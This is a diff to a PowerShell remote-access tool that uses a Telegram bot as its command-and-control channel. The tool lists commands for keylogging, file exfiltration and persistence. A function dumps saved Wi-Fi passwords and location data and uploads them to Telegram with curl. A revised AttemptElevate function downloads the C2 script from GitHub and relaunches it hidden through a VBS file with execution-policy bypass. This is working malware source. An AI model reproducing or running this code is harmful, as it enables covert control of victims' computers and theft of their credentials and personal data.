@@ -55,8 +55,6 @@ Function Options{
 $contents = "==============================================
 ========= $comp Telegram C2 Options List $comp ========
 ==============================================
-
-==============================================
 ============= $cmde Commands List $cmde ============
 ==============================================
 
@@ -73,7 +71,8 @@ Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
 RemovePersistance   : Remove Startup Persistance
 IsAdmin   : Checks if session has admin Privileges
-AttemptElevate  : Send user a prompt to gain Admin  
+AttemptElevate  : Send user a prompt to gain Admin
+
 =============================================="
 
 $params = @{chat_id = $ChatID ;text = $contents}
@@ -105,12 +104,12 @@ cfg, conf, docx, rft.
 
 ======== Using the Killswitch Function ========
 
-(Used for KeyCapture and Exfiltrate commands)
+(Used for the KeyCapture and Exfiltrate commands)
 set `$GHurl to an empty text file RAW url on github.
 Changing this file to contain the word 'True'
 will exit the current fuction and then
 the script will return to listen for further commands
-(can take a few mins to kill - be paitient..)
+(can take a upto 5 mins to kill - be paitient..)
 To set URL from here type `$GHurl = 'YOUR_TEXTFILE_URL' 
 into the chat (before invoking the function!)
 
@@ -312,11 +311,9 @@ $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSyste
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
-
 Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
 while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
 $Geolocate.Position.Location | Select Latitude,Longitude
-
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
@@ -354,9 +351,7 @@ $outpath = "$env:temp\SystemInfo.txt"
 "USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-
 $FilePath = "$env:temp\SystemInfo.txt"
-
 curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 Remove-Item -Path $FilePath -Force
 }
@@ -407,7 +402,7 @@ Remove-Item -Path $FilePath -Force
 }
 
 Function ShowButtons{
-$messagehead = "Press a Button to Continue"
+$messagehead = "Press a Button to Continue..."
 $inlineKeyboardJson = @"
 {
     "inline_keyboard": [
@@ -494,26 +489,41 @@ exit
 
 Function IsAdmin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-$contents = "$closed Session NOT Admin $closed"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
-}
-else{
-$contents = "$tick Session IS Admin $tick"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
-}
+    $contents = "$closed Current Session is NOT Admin $closed"
+    $params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    }
+    else{
+    $contents = "$tick Current Session IS Admin $tick"
+    $params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    }
 }
 
 
 Function AttemptElevate{
 if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
+    $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
+    $scriptContent | Out-File -FilePath $newScriptPath -force
+    if ($newScriptPath.Length -lt 100){
+        "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+        "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
+        i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+        }
+$tobat = @'
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
+'@
+    $pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
+    $tobat | Out-File -FilePath $pth -Force
+    sleep 2
+    Start-Process -FilePath $pth
+    rm -path "$env:TEMP\temp.ps1" -Force
     }
 }
 
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
-
 
 Function IsAuth{ 
 param($CheckMessage)
@@ -536,7 +546,9 @@ foreach ($line in $ReadAsArray){
     $ArrObj=New-Object psobject
     $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
     $FixedResult +=$ArrObj
-}return $FixedResult}
+}
+return $FixedResult
+}
 
 Function stgmsg{
 param($Messagetext,$ChatID)
@@ -551,7 +563,9 @@ Function rtgmsg{
 try{
     $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
     return $inMessage.result[-1]
-}Catch{return "TGFail"}}
+    }
+Catch{return "TGFail"}
+}
 
 #-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------
 
@@ -574,3 +588,4 @@ $messages=rtgmsg
         }
     }
 }
+
